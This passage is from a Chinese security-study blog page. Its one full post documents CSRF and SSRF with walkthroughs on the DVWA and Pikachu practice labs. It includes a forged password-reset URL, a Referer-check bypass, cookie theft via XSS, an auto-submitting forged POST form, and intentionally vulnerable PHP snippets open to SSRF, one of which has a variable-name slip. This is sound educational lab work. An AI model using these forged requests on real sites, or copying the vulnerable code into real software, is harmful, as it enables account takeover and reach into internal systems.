    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/03/ming-ling-zhi-xing-dai-ma-zhi-xing-lou-dong-xue-xi/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Shu1L">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/03/ming-ling-zhi-xing-dai-ma-zhi-xing-lou-dong-xue-xi/" itemprop="url">命令执行/代码执行漏洞学习</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-03T16:48:40+08:00">
                2020-04-03
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/03/php-fan-xu-lie-hua-lou-dong-xue-xi/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Shu1L">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/03/php-fan-xu-lie-hua-lou-dong-xue-xi/" itemprop="url">php反序列化漏洞学习</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-03T16:48:16+08:00">
                2020-04-03
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/03/xss-lou-dong-xue-xi/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Shu1L">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/03/xss-lou-dong-xue-xi/" itemprop="url">XSS漏洞学习</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-03T16:46:48+08:00">
                2020-04-03
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/03/csrf-ssrf-lou-dong-xue-xi/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Shu1L">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/03/csrf-ssrf-lou-dong-xue-xi/" itemprop="url">CSRF+SSRF漏洞学习</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-03T16:26:02+08:00">
                2020-04-03
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
                    <span itemprop="name">web漏洞学习</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="CSRF漏洞-SSRF漏洞笔记-靶场实战"><a href="#CSRF漏洞-SSRF漏洞笔记-靶场实战" class="headerlink" title="CSRF漏洞+SSRF漏洞笔记+靶场实战"></a>CSRF漏洞+SSRF漏洞笔记+靶场实战</h2><p>[TOC]</p>
<h3 id="CSRF漏洞部分"><a href="#CSRF漏洞部分" class="headerlink" title="CSRF漏洞部分"></a>CSRF漏洞部分</h3><h4 id="CSRF简述"><a href="#CSRF简述" class="headerlink" title="CSRF简述"></a>CSRF简述</h4><h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>CSRF攻击建立在浏览器和Web服务器的对话之中，并且能欺骗用户访问url，发起的目标是通过伪造的用户请求，该请求不是用户想发出去的请求，对服务器或服务来说，该请求是完全合法的请求，但却完成了攻击者的期望操作。</p>
<p>从代码上看，CSRF能攻击成功是攻击者猜到了你重要参数，因而伪造请求。</p>
<h5 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h5><p>1.攻击者必须在目标站点找到一个表单的提交入口，或者有类似的URL(例如用来转钱，修改受害者邮箱或者密码)</p>
<p>2.目标站点不能有检测referer头操作，或者被攻击者的浏览器允许referer欺骗</p>
<p>3.攻击者必须了解表单或者URL参数中的正确的值，如果有秘密验证值或者ID，攻击者没有猜对，攻击者很可能不成功。</p>
<p>4。攻击者必须诱使受害者访问有恶意代码的页面，并且此时受害者已经登录到目标站点。</p>
<h5 id="漏洞利用场景"><a href="#漏洞利用场景" class="headerlink" title="漏洞利用场景"></a>漏洞利用场景</h5><ul>
<li>有意义的操作（如修改密码）</li>
<li>验证过于简单（参数固定、我们可以设置参数）</li>
</ul>
<p><strong>漏洞类型</strong></p>
<ul>
<li>GET型</li>
<li>POST型</li>
</ul>
<h5 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h5><p>1.手工检测：抓包查看是否存在无token无referer验证这种情况。存在的话就会有CSRF漏洞</p>
<p>​                       如果存在无token有referer验证这种情况时，我们可以尝试空referer绕过或者尝试抓包伪造referer  </p>
<p>2.半自动检测：常用半自动检测漏洞的软件有CSRFTester,CSRF Request Builder等。</p>
<h5 id="常见的防御方法："><a href="#常见的防御方法：" class="headerlink" title="常见的防御方法："></a>常见的防御方法：</h5><ul>
<li><p><strong>使用验证码：</strong></p>
<p>验证码强制用户必须和应用进行交互，才能完成最终的请求</p>
</li>
<li><p><strong>验证HTTP referer字段：</strong></p>
<p>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，会带上Referer，通过验证Referer，可以判断请求的合法性，如果Referer是其他网站的话，就有可能是CSRF攻击，则拒绝该请求。</p>
</li>
<li><p><strong>在请求地址中添加token并验证：</strong></p>
<p>在HTTP请求中以参数的形式加入一个随机产生的token，并在服务器端建立一个拦截器来验证这个token，如果请求中没有token或者token不正确，则认为可能是CSRF攻击而拒绝该请求。</p>
</li>
</ul>
<h4 id="DVWA（CSRF部分）"><a href="#DVWA（CSRF部分）" class="headerlink" title="DVWA（CSRF部分）"></a>DVWA（CSRF部分）</h4><h5 id="simple"><a href="#simple" class="headerlink" title="simple:"></a>simple:</h5><img src="QQ截图20200123184231.png" style="zoom:50%;" />

<p><strong>分析：</strong></p>
<p>​      我们分析源代码可知，服务器收到修改密码的请求后，会检查参数password_new password_conf是否相同，如果相同，就会修改密码，并没有任何的防CSRF机制，所以我们只需要用户在cookie还有效的时间内在相同的浏览器访问我们给定的url（该操作是服务器对请求的发送者进行了身份验证，检查cookie），就可以实现CSRF攻击，修改用户密码。</p>
<p><strong>漏洞利用</strong></p>
<p>我们可以构造如下URL进行修改密码：</p>
<p><a href="http://localhost/DVWA/vulnerabilities/csrf/?password_new=admin&amp;password_conf=admin&amp;Change=Change#" target="_blank" rel="noopener">http://localhost/DVWA/vulnerabilities/csrf/?password_new=admin&amp;password_conf=admin&amp;Change=Change#</a></p>
<p>我们构造一个html表单提交页面</p>
<img src="QQ截图20200128112112.png" style="zoom:67%;" />

<p>将html文件放入本地网站的根目录下。</p>
<p>我们尝试在本地访问该网页</p>
<img src="QQ截图20200128112036.png" style="zoom:50%;" />



<p>点击后发现跳转到了DVWA更改密码界面，密码被修改</p>
<img src="QQ截图20200128112051.png" style="zoom:67%;" />



<h5 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>

<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">isset</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'Change'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// Checks to see where the request came from</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">stripos</span><span class="token punctuation">(</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span> <span class="token string">'HTTP_REFERER'</span> <span class="token punctuation">]</span> <span class="token punctuation">,</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span> <span class="token string">'SERVER_NAME'</span> <span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment" spellcheck="true">// Get input</span>
        <span class="token variable">$pass_new</span>  <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'password_new'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$pass_conf</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'password_conf'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>

        <span class="token comment" spellcheck="true">// Do the passwords match?</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$pass_new</span> <span class="token operator">==</span> <span class="token variable">$pass_conf</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment" spellcheck="true">// They do!</span>
            <span class="token variable">$pass_new</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$pass_new</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">""</span> <span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$pass_new</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span> <span class="token variable">$pass_new</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token comment" spellcheck="true">// Update the database</span>
            <span class="token variable">$insert</span> <span class="token operator">=</span> <span class="token string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> <span class="token punctuation">.</span> <span class="token function">dvwaCurrentUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"';"</span><span class="token punctuation">;</span>
            <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$insert</span> <span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span> <span class="token string">'&lt;pre>'</span> <span class="token punctuation">.</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$___mysqli_res</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'&lt;/pre>'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token comment" spellcheck="true">// Feedback for the user</span>
            <span class="token keyword">echo</span> <span class="token string">"&lt;pre>Password Changed.&lt;/pre>"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token comment" spellcheck="true">// Issue with passwords matching</span>
            <span class="token keyword">echo</span> <span class="token string">"&lt;pre>Passwords did not match.&lt;/pre>"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token comment" spellcheck="true">// Didn't come from a trusted source</span>
        <span class="token keyword">echo</span> <span class="token string">"&lt;pre>That request didn't look correct.&lt;/pre>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token boolean">false</span> <span class="token punctuation">:</span> <span class="token variable">$___mysqli_res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token delimiter">?></span> </code></pre>
<p><strong>分析：</strong></p>
<p>Medium级别的代码检查了保留变量 HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数，及要访问的主机名，这里是192.168.153.130），希望通过这种机制抵御CSRF攻击</p>
<p><strong>漏洞利用：</strong></p>
<p>我们用burp对数据进行抓包，不断对referer进行修改，最后发现referer需包含我们host名</p>
<img src="QQ截图20200128112923.png" style="zoom: 67%;" />





<p>查阅资料了解到referer参数和链接相同，我们可以将Html文件名中包含127.0.0.1,比如将html文件修改为</p>
<p>127.0.0.1.html</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200128113629.png" alt=""></p>
<p>我们在浏览器打开127.0.0.1.html，点击submit</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200128113414.png" alt=""></p>
<p>我们发现密码成功修改。</p>
<p><strong>high</strong></p>
<p>high等级我们发现在url中多了user_token,并且每次修改密码user_token都随着变化</p>
<p>usr_token的职责：它的职责是保护用户的用户名及密码多次提交，以防密码泄露。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200128114230.png" alt=""></p>
<p>如果该页面不存在XSS漏洞时，此方法就可以有效杜绝CSRF漏洞</p>
<p>但我们可以通过利用DVWA的XSS漏洞进行有效利用</p>
<p><strong>利用过程</strong></p>
<p>我们首先利用dvwa的XSS漏洞获取浏览器cookie.</p>
<img src="QQ截图20200128114910.png" style="zoom:50%;" />

<p>然后我们回到构造好的CSRF页面提交用Burp进行抓包</p>
<img src="QQ截图20200128115317.png" style="zoom:67%;" />

<p>我们使用获取到的cookie进行替换，然后发包即可成功修改密码。</p>
<p><strong>impossibe</strong></p>
<img src="QQ截图20200128120628.png" style="zoom:50%;" />

<p>它提示了要输入原始密码，这就保证了当前用户一定是本人，有效的确保了CSRF攻击。</p>
<h4 id="Pikachu平台-CSRF部分）"><a href="#Pikachu平台-CSRF部分）" class="headerlink" title="Pikachu平台(CSRF部分）"></a>Pikachu平台(CSRF部分）</h4><p><img src="QQ%E6%88%AA%E5%9B%BE20200129173327.png" alt=""></p>
<h5 id="CSRF-GET"><a href="#CSRF-GET" class="headerlink" title="CSRF(GET)"></a>CSRF(GET)</h5><p>我们首先根据右上角的提示登录账号</p>
<img src="QQ截图20200129173354.png" style="zoom:50%;" />





<img src="QQ截图20200129173746.png" style="zoom:67%;" />



<p>我们选择修改个人信息并用burp抓包</p>
<img src="QQ截图20200129173928.png" style="zoom:80%;" />

<p>提交的请求来看，后台没做CSRF token，同时也是通过GET请求来提交修改信息，我们拿到这个请求，伪造一个请求链接，然后让kobe点击就好，我们构造的URL中把地址add改为hack。kobe一点击就修改了地址。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200129174206.png" alt=""></p>
<h5 id="CSRF-POST"><a href="#CSRF-POST" class="headerlink" title="CSRF(POST)"></a>CSRF(POST)</h5><p>POST型，所有参数在请求体中提交，我们不能通过伪造URL的方式进行攻击。</p>
<p>这里的攻击方式跟XSS中POST类型是一样的，攻击者可以搭建一个站点，在站点上做一个表单，诱导lucy点击这个链接，当用户点击时，就会自动向存在CSRF的服务器提交POST请求修改个人信息。</p>
<p>我们编写一个自动提交表单的html文件：</p>
<pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">
window<span class="token punctuation">.</span>onload <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"postsubmit"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://192.168.171.133/pikachu/vul/csrf/csrfpost/csrf_post_edit.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sex<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sex<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>girl<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>phonenum<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>phonenum<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>12345678922<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>add<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>add<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hacker<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>lucy@pikachu.com<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>postsubmit<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>
<p>​      下面把页面的URL发送给受害者，只要受害者一点击这个链接，就会自动往服务器发送POST请求，修改地址信息。</p>
<h5 id="CSRF（token"><a href="#CSRF（token" class="headerlink" title="CSRF（token)"></a>CSRF（token)</h5><p> CSRF的主要问题是敏感操作容易被伪造，我们可以加入Token让请求不容易被伪造</p>
<ul>
<li><p>每次请求，都增加一个随机码(需要够随机，不容易被伪造），后台每次对这个随机码进行验证</p>
<p>我们进入Pikachu平台的CSRF（token）页面并登录，我们可以看一下这个GET请求</p>
</li>
</ul>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200203172940.png" alt=""></p>
<p>跟前面比较，这里多了一个Token，如果后台对提交的Token进行了验证，由于Token是随机的，我们就无法伪造URL了</p>
<h3 id="SSRF漏洞部分"><a href="#SSRF漏洞部分" class="headerlink" title="SSRF漏洞部分"></a>SSRF漏洞部分</h3><h4 id="SSRF简述"><a href="#SSRF简述" class="headerlink" title="SSRF简述"></a>SSRF简述</h4><p><img src="20181227082125119.png" alt=""></p>
<p>​    SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
<h5 id="漏洞形成原因"><a href="#漏洞形成原因" class="headerlink" title="漏洞形成原因"></a>漏洞形成原因</h5><p>SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p>
<p>例如：</p>
<p><code>www.xxx.com/a.php?image=http://www.abc.com/1.jpg</code></p>
<p>如果我们将<a href="http://www.abc.com/1.jpg换为与该服务器相连的内网服务器地址会产生什么效果呢？" target="_blank" rel="noopener">http://www.abc.com/1.jpg换为与该服务器相连的内网服务器地址会产生什么效果呢？</a></p>
<p>如果存在该内网地址就会返回1xx 2xx 之类的状态码，不存在就会其他的状态码</p>
<p>SSRF漏洞就是通过篡改获取资源的请求发送给服务器，但是服务器并没有发现这个请求是否合法，然后服务器以他的身份来访问其他服务器的资源。</p>
<p><strong>curl造成的SSRF</strong></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">function</span> <span class="token function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span><span class="token variable">$URL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<p><strong>file_get_contents造成的SSRF</strong></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
